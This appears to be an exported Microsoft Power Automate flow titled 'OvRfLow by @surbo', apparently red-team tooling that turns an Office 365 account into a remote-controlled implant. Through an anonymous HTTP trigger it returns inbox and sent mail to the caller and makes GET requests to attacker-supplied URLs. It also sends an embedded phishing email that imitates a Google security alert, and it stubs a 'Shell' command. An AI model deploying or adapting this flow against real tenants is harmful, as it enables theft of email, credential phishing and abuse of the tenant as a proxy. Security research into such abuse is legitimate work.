{"name":"92b6d280-5b5d-4f29-b204-4b5b1b44efdc","id":"/providers/Microsoft.Flow/flows/92b6d280-5b5d-4f29-b204-4b5b1b44efdc","type":"Microsoft.Flow/flows","properties":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_logicflows","displayName":"OvRfLow by @surbo","definition":{"metadata":{"workflowEntityId":null,"creator":{"id":"853e9a27-822b-4744-a07a-9457e7d718db","type":"User","tenantId":"c0f7ac69-4236-4530-80d7-9e7d5a981292"},"provisioningMethod":"FromDefinition","failureAlertSubscription":true,"clientLastModifiedTime":"2019-11-04T18:52:43.9246435Z"},"$schema":"https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#","contentVersion":"1.0.0.0","parameters":{"$connections":{"defaultValue":{},"type":"Object"},"$authentication":{"defaultValue":{},"type":"SecureObject"}},"triggers":{"manual":{"type":"Request","kind":"Http","inputs":{"schema":{}}}},"actions":{"Parse_JSON":{"runAfter":{},"type":"ParseJson","inputs":{"content":"@triggerBody()","schema":{"type":"object","properties":{"Task":{"type":"string"},"Term":{"type":"string"}}}}},"Switch":{"runAfter":{"Parse_JSON":["Succeeded"]},"cases":{"Case":{"case":"Search","actions":{"Get_emails":{"runAfter":{},"metadata":{"flowSystemMetadata":{"swaggerOperationId":"GetEmails"},"Id::AAMkADNkNjc4OWJjLWVhNzctNDdjYS1hNzQwLWE4MzYyM2JhYTY4MAAuAAAAAAADapgoif8RSquQ6m5cVkC-AQBppkU454SYQKe0ujYw5R5rAAAAAAEMAAA=":"Inbox"},"type":"ApiConnection","inputs":{"host":{"connection":{"name":"@parameters('$connections')['shared_office365']['connectionId']"},"api":{"runtimeUrl":"https://unitedstates-002.azure-apim.net/apim/office365"}},"method":"get","path":"/Mail","queries":{"folderPath":"Id::AAMkADNkNjc4OWJjLWVhNzctNDdjYS1hNzQwLWE4MzYyM2JhYTY4MAAuAAAAAAADapgoif8RSquQ6m5cVkC-AQBppkU454SYQKe0ujYw5R5rAAAAAAEMAAA=","fetchOnlyUnread":false,"includeAttachments":false,"searchQuery":"@body('Parse_JSON')?['Term']","top":20,"skip":0},"authentication":"@parameters('$authentication')"}},"Condition":{"actions":{"Compose":{"runAfter":{},"type":"Compose","inputs":"@body('Get_emails')"}},"runAfter":{"Get_emails":["Succeeded"]},"else":{"actions":{"Compose_2":{"runAfter":{},"type":"Compose","inputs":[{"Search":"NO DATA FOUND"}]}}},"expression":{"equals":["@not(empty(body('Get_emails')))",true]},"type":"If"},"Response_4":{"runAfter":{"Condition":["Succeeded"]},"type":"Response","kind":"Http","inputs":{"statusCode":200,"body":"@{outputs('Compose')}@{outputs('Compose_2')}"}}}},"Case_2":{"case":"Stress","actions":{"HTTP":{"runAfter":{},"type":"Http","inputs":{"method":"GET","uri":"@body('Parse_JSON')?['Term']"}}}},"Case_3":{"case":"Working","actions":{"Get_emails_2":{"runAfter":{},"metadata":{"flowSystemMetadata":{"swaggerOperationId":"GetEmails"}},"type":"ApiConnection","inputs":{"host":{"connection":{"name":"@parameters('$connections')['shared_office365']['connectionId']"},"api":{"runtimeUrl":"https://unitedstates-002.azure-apim.net/apim/office365"}},"method":"get","path":"/Mail","queries":{"folderPath":"Inbox","fetchOnlyUnread":false,"includeAttachments":false,"top":20,"skip":0},"authentication":"@parameters('$authentication')"}},"Response_2":{"runAfter":{"Get_emails_2":["Succeeded"]},"type":"Response","kind":"Http","inputs":{"statusCode":200,"body":"@body('Get_emails_2')"}}}},"Case_4":{"case":"Sending","actions":{"Get_emails_3":{"runAfter":{},"metadata":{"Id::AAMkADNkNjc4OWJjLWVhNzctNDdjYS1hNzQwLWE4MzYyM2JhYTY4MAAuAAAAAAADapgoif8RSquQ6m5cVkC-AQBppkU454SYQKe0ujYw5R5rAAAAAAEJAAA=":"Sent Items","flowSystemMetadata":{"swaggerOperationId":"GetEmails"}},"type":"ApiConnection","inputs":{"host":{"connection":{"name":"@parameters('$connections')['shared_office365']['connectionId']"},"api":{"runtimeUrl":"https://unitedstates-002.azure-apim.net/apim/office365"}},"method":"get","path":"/Mail","queries":{"folderPath":"Id::AAMkADNkNjc4OWJjLWVhNzctNDdjYS1hNzQwLWE4MzYyM2JhYTY4MAAuAAAAAAADapgoif8RSquQ6m5cVkC-AQBppkU454SYQKe0ujYw5R5rAAAAAAEJAAA=","fetchOnlyUnread":false,"includeAttachments":false,"top":20,"skip":0},"authentication":"@parameters('$authentication')"}},"Response_3":{"runAfter":{"Get_emails_3":["Succeeded"]},"type":"Response","kind":"Http","inputs":{"statusCode":200,"body":"@body('Get_emails_3')"}}}},"Case_5":{"case":"Phishing","actions":{"Send_an_email":{"runAfter":{},"metadata":{"flowSystemMetadata":{"swaggerOperationId":"SendEmail"}},"type":"ApiConnection","inputs":{"host":{"connection":{"name":"@parameters('$connections')['shared_office365']['connectionId']"},"api":{"runtimeUrl":"https://unitedstates-002.azure-apim.net/apim/office365"}},"method":"post","body":{"To":"flowtests@embracesec.onmicrosoft.com","Subject":"Remote Access","Body":"<head><link rel=3D\"stylesheet\" href=3D\"https://fonts.googleapis.com/css?fam=\nily=3DRoboto:300,400\"/></head><body style=3D\"background: #fff; margin: auto=\n; max-width: 600px; min-width: 348px; padding: 0 0;\"><div style=3D\"backgrou=\nnd: #fff; padding: 32px 0 16px 0;\"><img style=3D\"height: 32px; width: 92px;=\n padding: 0 0\" alt=3D\"Google\" src=3D\"https://ssl.gstatic.com/images/brandin=\ng/googlelogo/2x/googlelogo_color_120x44dp.png\"/></div><div style=3D\"color: =\n#fff; background: #4184f3; font: 400 24px Roboto,RobotoDraft,Helvetica,Aria=\nl,sans-serif; padding: 72px 32px 16px 32px;\">Someone Acccessed You're Account</div><div style=3D\"color: rgba(0, 0, 0, 0.87); font: 400=\n 20px Roboto,RobotoDraft,Helvetica,Arial,sans-serif; padding: 40px 32px 0 3=\n2px;\">Hi ,</div><div style=3D\"color: rgba(0, 0, 0, 0.87); font: 400 14=\npx/24px Roboto,RobotoDraft,Helvetica,Arial,sans-serif; font-style: normal; =\npadding: 32px 32px 0 32px;\"><a href=3D\"\"></a> Please Login and make sure you're account is secure=\n= <a href=3D\"https://support.google.com/families=\n?p=3Demail_joinafamily\">Access</a> that <a href=\n=3D\"</a> sets up.</div><div st=\nyle=3D\"padding: 32px 32px 0 32px;\"><div style=3D\"background: #458af4;border=\n-radius: 3px;box-shadow: 0 2px 5px 0 rgba(0, 0, 0, 0.4); display: inline-bl=\nock;font: 500 14px/36px Roboto,RobotoDraft,Helvetica,Arial,sans-serif; heig=\nht: 36px;line-height: 36px;min-width: 88px;padding: 0 16px;text-align: cent=\ner;\"><a style=3D\"color:#fff;font-size: 14px;text-decoration:none;\" href=3D\"=\nhttps://.google.com/\">ACCE=\nPT INVITATION</a></div></div><div style=3D\"border: 0; border-top: 1px solid=\n; color: rgba(0, 0, 0, 0.26); display: block; height: 1px; margin: 40px 16p=\nx 0 16px;\"></div><p style=3D\"color: rgba(0, 0, 0, 0.54); font: 400 10px/14p=\nx Roboto,RobotoDraft,Helvetica,Arial,sans-serif; padding: 16px;\">Google LLC=\n<br>1600 Amphitheatre Parkway,<br>Mountain View, CA 94043, USA</p></body>\n--0000000000003f1ac6059195020a--","Importance":"High","IsHtml":true},"path":"/Mail","authentication":"@parameters('$authentication')"}}}},"Case_6":{"case":"Shell","actions":{"Response":{"runAfter":{},"type":"Response","kind":"Http","inputs":{"statusCode":200},"description":"You will need to do a file list - with a on prem flow installed"}}}},"default":{"actions":{}},"expression":"@body('Parse_JSON')?['Task']","type":"Switch"}},"outputs":{}},"connectionReferences":{"shared_office365":{"connectionName":"shared-office365-07d0c6c4-4798-4ace-b6dd-82db4f1fb6c8","source":"Embedded","id":"/providers/Microsoft.PowerApps/apis/shared_office365","tier":"NotSpecified"}},"flowFailureAlertSubscribed":false}}